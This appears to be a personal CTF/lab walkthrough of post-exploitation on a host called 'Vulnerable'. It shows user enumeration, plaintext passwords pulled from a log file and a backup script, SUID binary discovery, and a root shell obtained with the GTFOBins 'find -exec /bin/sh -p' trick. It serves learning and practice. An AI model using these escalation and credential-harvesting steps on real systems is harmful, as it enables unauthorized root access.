---
id: post_exploitation
aliases:
  - AS www-data
tags: []
---


## AS www-data
### BASICS

```
www-data@Vulnerable:/var/www/html/joomla/_test$ cat /etc/group 
root:x:0:
...
adm:x:4:syslog,stoner
...
plugdev:x:46:stoner
...
lxd:x:110:stoner
...
ssh:x:114:
stoner:x:1000:
lpadmin:x:115:stoner
sambashare:x:116:stoner
...
mysql:x:118:
basterd:x:1001:
...
```

``` #6 #12
  www-data@Vulnerable:/var/www/html/joomla/_test$ ls -lah
  total 124K
  drwxr-xr-x  3 www-data www-data 4.0K Aug 22  2019 .
  drwxr-xr-x 25 www-data www-data 4.0K Aug 22  2019 ..
  -rwxr-xr-x  1 www-data www-data  53K Aug 22  2019 index.php
>>-rwxr-xr-x  1 www-data www-data  716 Aug 21  2019 log.txt <<
  -rwxr-xr-x  1 www-data www-data  52K Mar 19  2019 sar2html
  drwxr-xr-x  3 www-data www-data 4.0K Aug 22  2019 sarFILE
  www-data@Vulnerable:/var/www/html/joomla/_test$ cat log.txt 
  Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.
  Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.
>>Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$ <<
  Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)
  Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user
  Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 10.10.170.50 port 49824
  Aug 20 11:16:36 parrot sshd[2451]: pam_unix(sshd:session): session closed for user pentest
  Aug 20 12:24:38 parrot sshd[2443]: Received signal 15; terminating.
```

## AS basterd
### BASICS
```
basterd@Vulnerable:/var/www/html/joomla/_test$ sudo -l
[sudo] password for basterd: 
Sorry, user basterd may not run sudo on Vulnerable.
```

```
basterd@Vulnerable:/var/www/html/joomla/_test$ find / -perm /4000 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

```
basterd@Vulnerable:/var/www/html/joomla/_test$ cd /home/basterd/
basterd@Vulnerable:~$ ls -lah
total 16K
drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 .
drwxr-xr-x 4 root    root    4.0K Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4.0K Aug 22  2019 .cache
basterd@Vulnerable:~$ cat backup.sh 
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

>> USER=stoner <<
>> #superduperp@$$no1knows <<

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
             echo "Begining copy of" $i  >> $LOG
             scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
             echo $i "completed" >> $LOG

                if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
                    rm $SOURCE/$i
                    echo $i "removed" >> $LOG
                    echo "####################" >> $LOG
                                else
                                        echo "Copy not complete" >> $LOG
                                        exit 0
                fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
```
 
## AS stoner
### BASICS
```
stoner@Vulnerable:/home/basterd$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa
```

```
stoner@Vulnerable:/home/basterd$ find / -perm /4000 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap

>> /usr/bin/find <<

/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

### GTFObins
```
stoner@Vulnerable:/$ /usr/bin/find . -exec /bin/sh -p \; -quit
# whoami
root
```
